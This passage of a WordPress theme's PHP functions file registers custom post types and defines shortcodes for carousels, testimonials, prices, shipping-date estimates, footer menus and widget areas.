        $seo = trim(preg_replace('~[^0-9a-z]+~i', $slug, html_entity_decode(preg_replace('~&([a-z]{1,2})(?:acute|cedil|circ|grave|lig|orn|ring|slash|th|tilde|uml);~i', '$1', htmlentities($string, ENT_QUOTES, 'UTF-8')), ENT_QUOTES, 'UTF-8')), $slug);
        
        if(strlen($seo) > $maxlength)
        {
            $seo = substr($seo, 0, $maxlength);
            $pos = (int)strrpos($seo, $slug); //ultima posicion de la busqueda
            if($pos){
                $seo = substr($seo, 0, $pos);           
            }
        } 
            
        return $seo;
}

/*------------------------------------*\
    Post Type
\*------------------------------------*/

function cptui_register_my_cpts() {


    /**
     * Post Type: Prior Collections.
     */

    $labels = array(
        "name" => __( 'Prior Collections Carousel', '' ),
        "singular_name" => __( 'Prior Collections Carousel', '' ),
    );

    $args = array(
        "label" => __( 'Prior Collections Carousel', '' ),
        "labels" => $labels,
        "description" => "",
        "public" => true,
        "publicly_queryable" => true,
        "show_ui" => true,
        "show_in_rest" => false,
        "rest_base" => "",
        "has_archive" => false,
        "show_in_menu" => true,
        "exclude_from_search" => false,
        "capability_type" => "post",
        "map_meta_cap" => true,
        "hierarchical" => false,
        "rewrite" => array( "slug" => "prior_collections", "with_front" => true ),
        "query_var" => true,
        "supports" => array( "title", "thumbnail" ),
        "taxonomies" => array( "category" ),
    );

    register_post_type( "prior_collections", $args );


    /**
     * Post Type: Testimonials.
     */

    $labels = array(
        "name" => __( 'Testimonials Carousel', '' ),
        "singular_name" => __( 'Testimonials Carousel', '' ),
    );

    $args = array(
        "label" => __( 'Testimonials Carousel', '' ),
        "labels" => $labels,
        "description" => "",
        "public" => true,
        "publicly_queryable" => true,
        "show_ui" => true,
        "show_in_rest" => false,
        "rest_base" => "",
        "has_archive" => false,
        "show_in_menu" => true,
        "exclude_from_search" => false,
        "capability_type" => "post",
        "map_meta_cap" => true,
        "hierarchical" => false,
        "rewrite" => array( "slug" => "tpc_testimonials", "with_front" => true ),
        "query_var" => true,
        "supports" => array( "title", "thumbnail" ),
        "taxonomies" => array( "" ),
    );

    register_post_type( "tpc_testimonials", $args );

    /**
     * Post Type: Membership Carousel.
     */

    $labels = array(
        "name" => __( 'Membership Carousel', '' ),
        "singular_name" => __( 'Membership Carousel', '' ),
    );

    $args = array(
        "label" => __( 'Membership Carousel', '' ),
        "labels" => $labels,
        "description" => "",
        "public" => true,
        "publicly_queryable" => true,
        "show_ui" => true,
        "show_in_rest" => false,
        "rest_base" => "",
        "has_archive" => false,
        "show_in_menu" => true,
        "exclude_from_search" => false,
        "capability_type" => "post",
        "map_meta_cap" => true,
        "hierarchical" => false,
        "rewrite" => array( "slug" => "membership_carousel", "with_front" => true ),
        "query_var" => true,
        "supports" => array( "title", "thumbnail" ),
        "taxonomies" => array( "category" ),
    );

    register_post_type( "membership_carousel", $args );

    /**
     * Post Type: FAQ.
     */

    $labels = array(
        "name" => __( 'FAQ Accordion', '' ),
        "singular_name" => __( 'FAQ Accordion', '' ),
    );

    $args = array(
        "label" => __( 'FAQ Accordion', '' ),
        "labels" => $labels,
        "description" => "",
        "public" => true,
        "publicly_queryable" => true,
        "show_ui" => true,
        "show_in_rest" => false,
        "rest_base" => "",
        "has_archive" => false,
        "show_in_menu" => true,
        "exclude_from_search" => false,
        "capability_type" => "post",
        "map_meta_cap" => true,
        "hierarchical" => false,
        "rewrite" => array( "slug" => "tpc_faq_accordion", "with_front" => true ),
        "query_var" => true,
        "supports" => array( "title", "thumbnail" ),
        "taxonomies" => array( "" ),
    );


    register_post_type( "tpc_faq_accordion", $args );

    /**
     * Post Type: Prior Collections 2.
     */

    $labels = array(
        "name" => __( 'Prior Collections 2', '' ),
        "singular_name" => __( 'Prior Collections Carousel', '' ),
    );

    $args = array(
        "label" => __( 'Prior Collections 2', '' ),
        "labels" => $labels,
        "description" => "",
        "public" => true,
        "publicly_queryable" => true,
        "show_ui" => true,
        "show_in_rest" => false,
        "rest_base" => "",
        "has_archive" => false,
        "show_in_menu" => true,
        "exclude_from_search" => false,
        "capability_type" => "post",
        "map_meta_cap" => true,
        "hierarchical" => false,
        "rewrite" => array( "slug" => "prior_collections_2", "with_front" => true ),
        "query_var" => true,
        "supports" => array( "title", "thumbnail" ),
        "taxonomies" => array( "category" ),
    );

    register_post_type( "prior_collections_2", $args );

    /**
     * Post Type: What You Receive Carousel.
     */

    $labels = array(
        "name" => __( 'What You Receive Carousel', '' ),
        "singular_name" => __( 'What You Receive Carousel', '' ),
    );

    $args = array(
        "label" => __( 'What You Receive Carousel', '' ),
        "labels" => $labels,
        "description" => "",
        "public" => true,
        "publicly_queryable" => true,
        "show_ui" => true,
        "show_in_rest" => false,
        "rest_base" => "",
        "has_archive" => false,
        "show_in_menu" => true,
        "exclude_from_search" => false,
        "capability_type" => "post",
        "map_meta_cap" => true,
        "hierarchical" => false,
        "rewrite" => array( "slug" => "tpc_what_you_receive", "with_front" => true ),
        "query_var" => true,
        "supports" => array( "title", "thumbnail" ),
        "taxonomies" => array( "" ),
    );

    register_post_type( "tpc_what_you_receive", $args );

}

add_action( 'init', 'cptui_register_my_cpts' );

/*------------------------------------*\
    Carousel
\*------------------------------------*/

/********** [prior_collections category=''] **********/

function prior_collections( $atts ) {
    shortcode_atts( array(
        'category' => '',
    ), $atts );
    //$atts['category'];
    $arrow_none = "";
    $category_name = $atts['category'];
    $args = array(
        'post_type' => 'prior_collections',
        'category_name' => $category_name,
        'posts_per_page' => -1,
        'order'   => 'DESC'
    );
    $cont_arrow = 0;
    $attractions  = new WP_Query($args); 
    while($attractions->have_posts()) : $attractions->the_post(); 
        $cont_arrow = $cont_arrow + 1;
    endwhile; 
    wp_reset_postdata();
    if ($cont_arrow < 2) {
        $arrow_none = "arrow-none";
    }
    ?>
    <div class="<?php echo $arrow_none ?> cd-testimonials-wrapper cd-container pw-pcc">
      <ul class="cd-testimonials">
        <?php 
            while($attractions->have_posts()) : $attractions->the_post(); 
        ?>
                <li>
                    <div class="copy-container-int-pages">
                        <div class="copy-container-hor-carousel">
                            <?php 
                            $image = get_field('image');
                            if( !empty($image) ): ?>
                                <img src="<?php echo $image['url']; ?>" alt="<?php echo $image['alt']; ?>" />
                            <?php endif; ?>
                        </div> <!-- copy-container  -->
                    </div>
                </li>       
        <?php
            endwhile; 
        
            // Restore original post data.
            wp_reset_postdata();
        ?>
      </ul> <!-- cd-testimonials -->
    
    </div> <!-- cd-testimonials-wrapper -->
    <?php
}
add_shortcode( 'prior_collections', 'prior_collections' );


function testimonials_carousel() {
    $id = cd_change_name("cd-testim-");
    $arrow_none = "";
    $cont_arrow = 0;
    $args = array(
        'post_type' => 'tpc_testimonials',
        'posts_per_page' => -1,
        'order'   => 'DESC'
    );
    $attractions  = new WP_Query($args); 
    while($attractions->have_posts()) : $attractions->the_post(); 
        $cont_arrow = $cont_arrow + 1;
    endwhile; 
    wp_reset_postdata();
    if ($cont_arrow < 2) {
        $arrow_none = "arrow-none";
    }
    ?>
    <div class="cd-quotation-testimonials"></div>
    <div class="<?php echo $arrow_none ?> cd-testimonials-wrapper cd-container pw-pcc cd-quotation">
      <ul class="cd-testimonials">
        <?php 
            $attractions  = new WP_Query($args); 
            while($attractions->have_posts()) : $attractions->the_post(); 

                $tpc_stars_n = 0;
                $field = get_field_object('number_of_stars');
                $tpc_stars_n = $field['value'];
                $tpc_stars = '<div class="tpc-testim-stars"></div>';
                for ($i=1; $i < $tpc_stars_n; $i++) { 
                    $tpc_stars .= '<div class="tpc-testim-stars"></div>';
                }
                ?>
                <li>
                    <div class="copy-container-int-pages">
                        <div class="copy-container-hor-carousel">
                            <?php $image = get_field('image'); ?>
                            <div class="tpc-img-testim" style="background-image: url(<?php echo $image['url']; ?>);"></div>
                            <div class="tpc-content-testim">
                                <p class="tpc-testim-text"><?php echo do_shortcode(get_field('testimonies-text-box')); ?></p>
                                <div class="tpc-content-stars"><?php echo $tpc_stars; ?></div>
                                <p class="tpc-testim-date"><?php the_field('date_of_testimony'); ?></p>
                            </div>
                        </div> <!-- copy-container  -->
                    </div>
                </li>       
                <?php
            endwhile; 
        
            // Restore original post data.
            wp_reset_postdata();
        ?>
      </ul> <!-- cd-testimonials -->
    
    </div> <!-- cd-testimonials-wrapper -->
    <?php
}
add_shortcode( 'testimonials_carousel', 'testimonials_carousel' );

function testimonials_carousel_design_two() {
    $args = array(
        'post_type' => 'tpc_testimonials',
        'posts_per_page' => -1,
        'order'   => 'DESC'
    );
    $cont_arrow = 0;
    $arrow_none = "";
    $attractions  = new WP_Query($args); 
    while($attractions->have_posts()) : $attractions->the_post(); 
        $cont_arrow = $cont_arrow + 1;
    endwhile; 
    wp_reset_postdata();
    if ($cont_arrow < 3) {
        $arrow_none = "arrow-none";
    }
    ?>
    <div class="<?php echo $arrow_none ?> cd-testimonials-2 cd-diy-none-max-768 cd-testimonials-wrapper cd-container pw-pcc cd-quotation">
      <ul class="cd-testimonials">
        <?php 
            $attractions  = new WP_Query($args); 
            $cont = 1;
            while($attractions->have_posts()) : $attractions->the_post(); 
                $cont = $cont + 1;
                $tpc_stars_n = 0;
                $field = get_field_object('number_of_stars');
                $tpc_stars_n = $field['value'];
                $tpc_stars = '<div class="tpc-testim-stars"></div>';
                for ($i=1; $i < $tpc_stars_n; $i++) { 
                    $tpc_stars .= '<div class="tpc-testim-stars"></div>';
                }
                if ($cont == 2) {
                  echo "<li>";  
                }
                if ($cont == 3) {
                    echo "<div class='vertical-line'></div>";  
                }
                ?>
                    <div class="copy-container-int-pages">
                        <div class="copy-container-hor-carousel">
                            <?php $image = get_field('image'); ?>
                            <div class="tpc-img-testim" style="background-image:  url(<?php echo get_template_directory_uri().'/img/balloon.png'; ?>), url(<?php echo $image['url']; ?>);"></div>
                            <div class="tpc-content-testim">
                                <p class="tpc-testim-text"><?php echo do_shortcode(get_field('testimonies-text-box')); ?></p>
                                <p class="tpc-testim-date"><?php the_field('date_of_testimony'); ?></p>
                                <div class="tpc-content-stars"><?php echo $tpc_stars; ?></div>
                            </div>
                        </div> <!-- copy-container  -->
                    </div>
                <?php
                if ($cont == 3) {
                    echo "</li>";  
                    $cont = 1;
                }
            endwhile; 
        
            // Restore original post data.
            wp_reset_postdata();
            if ($cont == 2) {
                echo "</li>";  
                $cont = 1;
            }
        ?>
      </ul> <!-- cd-testimonials -->
    
    </div> <!-- cd-testimonials-wrapper -->

    <div class="<?php echo $arrow_none ?> cd-testimonials-2 cd-diy-none-min-768 cd-testimonials-wrapper cd-container pw-pcc cd-quotation">
      <ul class="cd-testimonials">
        <?php 
            $cont = 1;
            while($attractions->have_posts()) : $attractions->the_post(); 
                $cont = $cont + 1;
                $tpc_stars_n = 0;
                $field = get_field_object('number_of_stars');
                $tpc_stars_n = $field['value'];
                $tpc_stars = '<div class="tpc-testim-stars"></div>';
                for ($i=1; $i < $tpc_stars_n; $i++) { 
                    $tpc_stars .= '<div class="tpc-testim-stars"></div>';
                }
                ?>
                <li>
                    <div class="copy-container-int-pages">
                        <div class="copy-container-hor-carousel">
                            <?php $image = get_field('image'); ?>
                            <div class="tpc-img-testim" style="background-image:  url(<?php echo get_template_directory_uri().'/img/balloon.png'; ?>), url(<?php echo $image['url']; ?>);"></div>
                            <div class="tpc-content-testim">
                                <p class="tpc-testim-text"><?php echo do_shortcode(get_field('testimonies-text-box')); ?></p>
                                <p class="tpc-testim-date"><?php the_field('date_of_testimony'); ?></p>
                                <div class="tpc-content-stars"><?php echo $tpc_stars; ?></div>
                            </div>
                        </div> <!-- copy-container  -->
                    </div>
                </li>
                <?php
            endwhile; 
        
            // Restore original post data.
            wp_reset_postdata();
        ?>
      </ul> <!-- cd-testimonials -->
    
    </div> <!-- cd-testimonials-wrapper -->
    <?php
}

/********** [follow_the_purse_club] **********/

function follow_the_purse_club() {
    $id = cd_change_name("cd-follow-");
    $cont = 0;
    for ($i=1; $i < 4 ; $i++) { 
        $image = get_field('image_'.$i);
        $field = get_field_object('to_show_'.$i);
        if( !empty($image)){
            $cont = $cont + 1;
        }
    }
    ?>
    <div class="cd-diy-none-max-768 cd-section cd-cant-<?php echo $cont; ?>">
        <div class="cd-container-follow">
            <?php 
            $cont2 = 0;
            for ($i=1; $i < 4 ; $i++) { 
                $image = get_field('image_'.$i);
                $field = get_field_object('to_show_'.$i);
                if( !empty($image)){
                    $cont2 = $cont2 + 1;
                    ?>
                    <div class="cd-col-container cd-col-follow cd-col-cant-3 cd-col-<?php echo $cont2; ?>">
                        <?php if (get_field('button_text_'.$i) == "" and get_field('link_button_'.$i) != ""): ?>
                            <a href="<?php the_field('link_button_'.$i); ?>" target="_blank">
                        <?php endif ?>
                            <?php if (get_field('title_'.$i) != "" or get_field('content_text_'.$i) != "" or get_field('button_text_'.$i) != ""): ?>
                                <div class="cd-container-col">
                                    <h3><?php the_field('title_'.$i); ?></h3>
                                    <p><?php the_field('content_text_'.$i); ?></p>
                                    <?php 
                                    $button_text = get_field('button_text_'.$i);
                                    if ( !empty($button_text) ): ?>
                                        <a class="tpc-button-shadow tpc-button-social" href="<?php the_field('link_button_'.$i); ?>"><?php the_field('button_text_'.$i); ?></a>
                                    <?php endif ?>
                                </div>
                            <?php endif ?>
                            <img src="<?php echo $image['url']; ?>" alt="<?php echo $image['alt']; ?>" />
                        <?php if (get_field('button_text_'.$i) == "" and get_field('link_button_'.$i) != ""): ?>
                            </a>
                        <?php endif ?>
                    </div>
                <?php
                } 
            }
            ?>
        </div>
        <div class="cd-spac"></div>
    </div>
    <div class="cd-diy-none-min-768 cd-testimonials-wrapper cd-container pw-pcc">
      <ul class="cd-testimonials">
        <?php 
            for ($i=1; $i < 4 ; $i++) { 
                $image = get_field('image_'.$i);
                $field = get_field_object('to_show_'.$i);
                if( !empty($image)){
                    ?>
                <li>
                    <div class="copy-container-int-pages">
                        <div class="copy-container-hor-carousel">
                            <div class="cd-col-container">
                            <?php if (get_field('button_text_'.$i) == "" and get_field('link_button_'.$i) != ""): ?>
                                <a href="<?php the_field('link_button_'.$i); ?>" target="_blank">
                            <?php endif ?>
                                <?php if (get_field('title_'.$i) != "" or get_field('content_text_'.$i) != "" or get_field('button_text_'.$i) != ""): ?>    
                                    <div class="cd-container-col">
                                        <h3><?php the_field('title_'.$i); ?></h3>
                                        <p><?php the_field('content_text_'.$i); ?></p>
                                        <?php 
                                        $button_text = get_field('button_text_'.$i);
                                        if ( !empty($button_text) ): ?>
                                            <a class="tpc-button-shadow" href="<?php the_field('link_button_'.$i); ?>"><?php the_field('button_text_'.$i); ?></a>
                                        <?php endif ?>
                                    </div>
                                <?php endif ?>
                                <img src="<?php echo $image['url']; ?>" alt="<?php echo $image['alt']; ?>" />
                            <?php if (get_field('button_text_'.$i) == "" and get_field('link_button_'.$i) != ""): ?>
                                </a>
                            <?php endif ?>                                
                            </div>
                        </div> <!-- copy-container  -->
                    </div>
                </li>       
                <?php
                } 
            }

        ?>
      </ul> <!-- cd-testimonials -->
    
    </div> <!-- cd-testimonials-wrapper -->
    <?php
}
add_shortcode( 'follow_the_purse_club', 'follow_the_purse_club' );

function prior_collections_design_two() {
    $arrow_none = "";
    $cont_arrow = 0;
    $args = array(
        'post_type' => 'prior_collections_2',
        'posts_per_page' => -1,
        'order'   => 'DESC'
    );
    $attractions  = new WP_Query($args);
    while($attractions->have_posts()) : $attractions->the_post(); 
        $cont_arrow = $cont_arrow + 1;
    endwhile; 
    wp_reset_postdata();
    if ($cont_arrow < 4) {
        $arrow_none = "arrow-none";
    }
    ?>
    <div class="<?php echo $arrow_none ?> cd-diy-none-max-768 prior-collections-design-two cd-testimonials-wrapper cd-container">
        <ul class="cd-testimonials">
            <?php 
            $cont = 0;
            while($attractions->have_posts()) : $attractions->the_post(); 
                $image = get_field('image');
                if( !empty($image)){
                
                    if ($cont == 0) { ?>
                        <li>
                            <div class="copy-container-int-pages">
                                <div class="copy-container-hor-carousel">
                    <?php
                    }
                    $cont = $cont + 1;
                    ?>
                        <div class="item-prior-collections">
                            <?php if (get_field('button_text') == "" and get_field('link_button') != ""): ?>
                                <a href="<?php the_field('link_button'); ?>" target="_blank">
                            <?php endif ?>
                                <?php if (get_field('title') != "" or get_field('content_text') != "" or get_field('button_text') != ""): ?>    
                                    <div class="cd-container-col">
                                        <h3><?php the_field('title'); ?></h3>
                                        <p><?php the_field('content_text'); ?></p>
                                        <?php 
                                        $button_text = get_field('button_text');
                                        if ( !empty($button_text) ): ?>
                                            <a class="tpc-button-shadow" href="<?php the_field('link_button'); ?>"><?php the_field('button_text'); ?></a>
                                        <?php endif ?>
                                    </div>
                                <?php endif ?>
                                <img src="<?php echo $image['url']; ?>" alt="<?php echo $image['alt']; ?>" />
                            <?php if (get_field('button_text') == "" and get_field('link_button') != ""): ?>
                                </a>
                            <?php endif ?>   
                        </div>
                    <?php 
                    if ($cont == 3) { ?>
                                </div> <!-- copy-container  -->
                            </div>
                        </li>   
                        <?php
                        $cont = 0;
                    }
                } 
            endwhile; 
            // Restore original post data.
            wp_reset_postdata();
            ?>
      </ul> <!-- cd-testimonials -->
    </div>
    <div class="<?php echo $arrow_none ?> cd-diy-none-min-768 prior-collections-design-two cd-testimonials-wrapper cd-container pw-pcc">
      <ul class="cd-testimonials">
            <?php 
            $cont2 = 0;
            while($attractions->have_posts()) : $attractions->the_post(); 
                $image = get_field('image');
                if( !empty($image)){
                    ?>
                <li>
                    <div class="copy-container-int-pages">
                        <div class="copy-container-hor-carousel">
                            <div class="item-prior-collections-2">
                                <?php if (get_field('button_text') == "" and get_field('link_button') != ""): ?>
                                    <a href="<?php the_field('link_button'); ?>" target="_blank">
                                <?php endif ?>
                                    <?php if (get_field('title') != "" or get_field('content_text') != "" or get_field('button_text') != ""): ?>    
                                        <div class="cd-container-col">
                                            <h3><?php the_field('title'); ?></h3>
                                            <p><?php the_field('content_text'); ?></p>
                                            <?php 
                                            $button_text = get_field('button_text');
                                            if ( !empty($button_text) ): ?>
                                                <a class="tpc-button-shadow" href="<?php the_field('link_button'); ?>"><?php the_field('button_text'); ?></a>
                                            <?php endif ?>
                                        </div>
                                    <?php endif ?>
                                    <img src="<?php echo $image['url']; ?>" alt="<?php echo $image['alt']; ?>" />
                                <?php if (get_field('button_text') == "" and get_field('link_button') != ""): ?>
                                    </a>
                                <?php endif ?>                                
                            </div> <!-- copy-container  -->
                        </div>
                    </div>
                </li>       
                <?php
                } 
            endwhile; 
            // Restore original post data.
            wp_reset_postdata();
            ?>
      </ul> <!-- cd-testimonials -->
    
    </div> <!-- cd-testimonials-wrapper -->
    <?php
}

function bootstrap_carousel($category_name) {
    $id_carousel = cd_change_name("carousel-"); 
    $carousel_quantity = 0;
    $args = array(
        'post_type' => 'membership_carousel',
        'category_name' => $category_name,
        'posts_per_page' => -1,
        'order'   => 'DESC'
    );
    $attractions  = new WP_Query($args); 
    while($attractions->have_posts()) : $attractions->the_post(); 
        $image = get_field('image');
        if( !empty($image) ){
            $carousel_quantity = $carousel_quantity + 1;
        }
    endwhile; 
    
    // Restore original post data.
    wp_reset_postdata();
    ?>
    <?php if ($carousel_quantity > 1){ ?>
        <div id="<?php echo $id_carousel; ?>" class="carousel slide tpc-carousel" data-ride="carousel">
          <!-- Wrapper for slides -->
            <div class="tpc-carousel-slider">
                <div class="carousel-inner">
                <?php $cont2 = 0; ?>
                <?php 
                $args = array(
                    'post_type' => 'membership_carousel',
                    'category_name' => $category_name,
                    'posts_per_page' => -1,
                    'order'   => 'DESC'
                );
                $attractions  = new WP_Query($args); 
                while($attractions->have_posts()) : $attractions->the_post(); 
                    $cd_active = "";
                    if ($cont2 == 0) {
                        $cd_active = "active";
                    }
                    $image = get_field('image');
                    if( !empty($image) ){
                            echo '<div class="item '.$cd_active.'"><img src="'.$image["url"].'" alt="'.$image["alt"].'" style="width:100%;"></div>';
                    }
                    $cont2 = $cont2 + 1;
                endwhile; 
                
                // Restore original post data.
                wp_reset_postdata();
                ?>
            </div>

            <!-- Left and right controls -->
            <a class="left carousel-control" href="#<?php echo $id_carousel; ?>" data-slide="prev">
                <span class="glyphicon glyphicon-chevron-left"></span>
                <span class="sr-only">Previous</span>
            </a>
            <a class="right carousel-control" href="#<?php echo $id_carousel; ?>" data-slide="next">
                <span class="glyphicon glyphicon-chevron-right"></span>
                <span class="sr-only">Next</span>
            </a>
            </div>
            <!-- Indicators -->
            <ol class="carousel-indicators">
                <?php $cont = 1; ?>
                <?php $cont2 = 0; ?>
                <?php 
                $attractions  = new WP_Query($args); 
                while($attractions->have_posts()) : $attractions->the_post(); 
                    $image = get_field('image');
                    if( !empty($image) ){
                        $tpc_class = "";
                        if ($cont2 == 0) {
                            $tpc_class = 'class="active"';
                        }
                        if ($cont == 4) {
                            $tpc_class = '';
                            $cont = 0;
                        }
                        $imageSm  = $image['url'];
                        $string = "";
                        $validepng = strpos($imageSm, ".png");
                        if ($validepng != false) {
                            $string = ".png";
                        }
                        $validejpg = strpos($imageSm, ".jpg");
                        if ($validejpg != false) {
                            $string = ".jpg";
                        }
                        $validegif = strpos($imageSm, ".gif");
                        if ($validegif != false) {
                            $string = ".gif";
                        }
                        $imagePorciones = explode($string, $imageSm);
                        $imageSm =  $imagePorciones[0] ."-150x150". $imagePorciones[1] . $string;
                        ?>
                        <li data-target="#<?php echo $id_carousel; ?>" data-slide-to="<?php echo $cont2; ?>" <?php echo $tpc_class; ?> style="background-image: url(<?php echo get_template_directory_uri().'/img/transparent-white.png'; ?>), url('<?php echo $imageSm; ?>');"><img src="<?php echo get_template_directory_uri().'/img/transparent.png'; ?>"></li>
                        <?php
                        $cont = $cont + 1;
                        $cont2 = $cont2 + 1;
                        if ($cont2 == 1) {
                           $imageSm0 = $imageSm;
                        }
                        if ($cont2 == 2) {
                           $imageSm1 = $imageSm;
                        }
                        if ($cont2 == 3) {
                           $imageSm2 = $imageSm;
                        }
                    }
                endwhile; 
                
                // Restore original post data.
                wp_reset_postdata();
                ?>
                <?php if ($cont2 > 3) { ?>
                    <li data-target="#<?php echo $id_carousel; ?>" data-slide-to="0" <?php echo $tpc_class; ?> style="background-image: url('<?php echo $imageSm0; ?>');"><img src="<?php echo get_template_directory_uri().'/img/transparent-white.png'; ?>"></li>
                    <li data-target="#<?php echo $id_carousel; ?>" data-slide-to="1" <?php echo $tpc_class; ?> style="background-image: url('<?php echo $imageSm1; ?>');"><img src="<?php echo get_template_directory_uri().'/img/transparent-white.png'; ?>"></li>
                    <li data-target="#<?php echo $id_carousel; ?>" data-slide-to="2" <?php echo $tpc_class; ?> style="background-image: url('<?php echo $imageSm2; ?>');"><img src="<?php echo get_template_directory_uri().'/img/transparent-white.png'; ?>"></li>
                <?php } ?>
            </ol>
        </div>
    <?php }elseif ($carousel_quantity == 1) {
        $attractions  = new WP_Query($args); 
        while($attractions->have_posts()) : $attractions->the_post(); 
            $image = get_field('image');
            if( !empty($image) ){
                echo '<img src="'.$image["url"].'" alt="'.$image["alt"].'" style="width:100%;">';
            }
        endwhile; 
        
        // Restore original post data.
        wp_reset_postdata();
    }
}

/********** What You Receive Carousel **********/

function what_you_receive_carousel() {
    ?>
    <div class="cd-diy-none-max-768">
            <?php
            $carousels = get_posts(array(
                'post_type' => 'tpc_what_you_receive',
                'posts_per_page' => -1,
                'order' => 'DESC'
            ));
            foreach ($carousels as $key => $carousel) {
                $image = get_field('image', $carousel->ID);
                if( !empty($image) ) {
                    ?>
                        <div class="col-xs-5ths col-sm-5ths col-md-5ths col-lg-5ths">
                            <img src="<?php echo $image['url']; ?>" alt="<?php echo $image['alt']; ?>">
						</div>
                    <?php
                }
            }
            ?>
    </div>
    <div class="cd-diy-none-min-768 cd-testimonials-wrapper">
      <ul class="cd-testimonials">
            <?php
            foreach ($carousels as $key => $carousel) {
                $image = get_field('image', $carousel->ID);
                if( !empty($image) ) {
                    ?>
                        <li>
                            <div class="copy-container-int-pages">
                                <div class="copy-container-hor-carousel">
                                    <img src="<?php echo $image['url']; ?>" alt="<?php echo $image['alt']; ?>">
                                </div>
                            </div>
                        </li>
                    <?php
                }
            }
            ?>
      </ul> <!-- cd-testimonials -->
    </div> <!-- cd-testimonials-wrapper -->
    <?php
}

/*------------------------------------*\
    ShortCode
\*------------------------------------*/

/********** [bold_pink][/bold_pink] **********/

function bold_pink( $atts, $content = null ) {
    return "<span class='bold-pink'>".$content."</span>";
}
add_shortcode( 'bold_pink', 'bold_pink' );

/********** [tpc_price value=""] **********/

function tpc_price($atts) {
    shortcode_atts( array(
        'value' => '',
    ), $atts );

    if (!empty($atts['value'])) {
        $price_product = "<span><sup>$</sup><sub id='tpc-price-value'>".$atts['value']."</sub></span>";
    }else{
        $price_product = "<span><sup>$</sup><sub></sub></span>";
    }
    return $price_product;
}
add_shortcode( 'tpc_price', 'tpc_price' );

/********** [tpc_price_big value=""] **********/

function tpc_price_big($atts) {
    shortcode_atts( array(
        'value' => '',
    ), $atts );

         return "<span>$<sub>".$atts['value']."</sub></span>";
}
add_shortcode( 'tpc_price_big', 'tpc_price_big' );

function tpc_price_code($name) {
    $string = get_field($name);
    $price = "";
    if (!empty($price)) {
        $string = str_replace("<sup>$</sup><sub></sub>", "<sup>$</sup>".$price."<sub></sub>", $string);
    }
    return $string;
}
/********** [tpc_line content=""] **********/

function tpc_line( $atts ) {
    shortcode_atts( array(
        'content' => '',
    ), $atts );
    //$atts['category'];
    return "<span class='sub-line'>".$atts['content']."<span></span></span>";
}
add_shortcode( 'tpc_line', 'tpc_line' );


/********** [tpc_shipping_estimate days=""] **********/

function tpc_shipping_estimate($atts) {
    shortcode_atts( array(
        'days' => '',
    ), $atts );
    $number_of_days = 0;
    $days2 = get_field('number_of_days_for_shipment');
    if( !empty($days2) ){
        $number_of_days = $days2;
    }
    $year = date("Y");
    $month = date("m");
    $day = date("d");
    $day = $day + $number_of_days;
    $shipping_estimate = date("F jS Y", mktime(0,0,0,$month,$day,$year));;

    return '<span class="tpc-red">'.$shipping_estimate.'</span>';
}
add_shortcode( 'tpc_shipping_estimate', 'tpc_shipping_estimate' );

/********** [accordion_footer titel_1='' titel_2='' titel_3=''] **********/

function accordion_footer($atts) {
    shortcode_atts( array(
        'titel_1' => '',
        'titel_2' => '',
        'titel_3' => '',
    ), $atts );
    //$atts['titel'];
    echo '<div class="hidden-xs">';
        for ($i=1; $i < 4 ; $i++) { 
            echo '<div class="tpc-footer-container hidden-xs col-sm-4 col-md-4 col-lg-4">';
                echo "<h3>".$atts['titel_'.$i]."</h3>";
                echo '<div class="tpc-container-footer">';
                    tpc_footer_menu('tpc-footer-menu-'.$i); 
                echo '</div>';
            echo '</div>';
        }
    echo '</div>';
    echo '<div class="accordion col-xs-12 hidden-sm hidden-md hidden-lg">';
        for ($i=1; $i < 4 ; $i++) { 
            echo '<div class="accordion-section">';
                echo "<a class='accordion-section-title' href='#accordion-footer-".$i."'>".$atts['titel_'.$i]."</a>";
                echo '<div id="accordion-footer-'.$i.'" class="accordion-section-content">';
                    tpc_footer_menu('tpc-footer-menu-'.$i); 
                echo '</div>';
            echo '</div>';
        }
    echo '</div>';
}
add_shortcode( 'accordion_footer', 'accordion_footer' );

/*------------------------------------*\
    Widgets
\*------------------------------------*/

function cd_widgets_init() {
    register_sidebar( array(
        'name'          => __( 'Social Bar', '' ),
        'id'            => 'tpc-social-bar',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h3 class="widget-title" style="display: none;">',
        'after_title'   => '</h3>',
    ) );
    register_sidebar( array(
        'name'          => __( 'Footer', '' ),
        'id'            => 'tpc-footer',
        'before_widget' => '<div id="%1$s" class="tpc-footer">',
        'after_widget'  => '</div>',
        'before_title'  => '<h3 class="widget-title" style="display: none;">',
        'after_title'   => '</h3>',
    ) );
    register_sidebar( array(
        'name'          => __( 'Copyright', '' ),
        'id'            => 'tpc-copyright',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h3 class="widget-title" style="display: none;">',
        'after_title'   => '</h3>',
    ) );
    register_sidebar( array(
        'name'          => __( 'Contact Us', '' ),
        'id'            => 'tpc-contact-us',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h3 class="widget-title" style="display: none;">',
        'after_title'   => '</h3>',
    ) );
    register_sidebar( array(
        'name'          => __( 'Privacy And Terms', '' ),
        'id'            => 'tpc-privacy-and-terms',
        'before_widget' => '<div id="%1$s" class="modal-body pt-text-box">',
        'after_widget'  => '</div>',
        'before_title'  => '<div class="modal-header pt-header"> <button type="button" class="close" data-dismiss="modal">&times;</button> <h4 class="modal-title">',
        'after_title'   => '</h4> <div class="underline-pt"></div> </div>',
    ) );
}
add_action( 'widgets_init', 'cd_widgets_init' );

/*------------------------------------*\
    woocommerce cart needs shipping address
\*------------------------------------*/

add_filter( 'woocommerce_cart_needs_shipping_address', '__return_true', 50 );

/*------------------------------------*\
    Footer Menu
\*------------------------------------*/

function tpc_footer_menu($footer_menu)
{
    wp_nav_menu(
    array(
        'theme_location'  => $footer_menu,
        'menu'            => '',
        'container'       => 'div',
        'container_class' => 'tpc-menu-{menu slug}-container',
        'container_id'    => '',
        'menu_class'      => 'tpc-menu',
        'menu_id'         => '',
        'echo'            => true,
        'fallback_cb'     => 'wp_page_menu',
        'before'          => '',
        'after'           => '',
        'link_before'     => '',
        'link_after'      => '',
        'items_wrap'      => '<ul class="">%3$s</ul>',
        'depth'           => 0,
        'walker'          => ''
        )
    );
}

function register_footer_menu()
{
    register_nav_menus(array( // Using array to specify more menus if needed
        'tpc-footer-menu-1' => __('Footer Menu 1', 'html5blank'),
        'tpc-footer-menu-2' => __('Footer Menu 2', 'html5blank'),
